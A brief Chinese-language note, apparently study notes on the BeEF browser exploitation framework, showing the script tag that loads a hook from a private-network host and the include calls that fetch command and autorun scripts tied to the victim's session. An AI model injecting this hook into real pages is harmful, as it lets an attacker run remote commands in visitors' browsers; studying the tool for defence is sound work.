通过<script type="text/javascript" src="http://192.168.1.112/bf/hook/beefmagic.js.php"></script> 
来获取bf/hook/beefmagic.js.php 中的js
  然后include(beef_url + '/hook/command.php?BeEFSession=<?php echo session_id(); ?>&time=' + date);
      include(beef_url + '/hook/autorun.js.php?BeEFSession=<?php echo session_id(); ?>&time=' + date);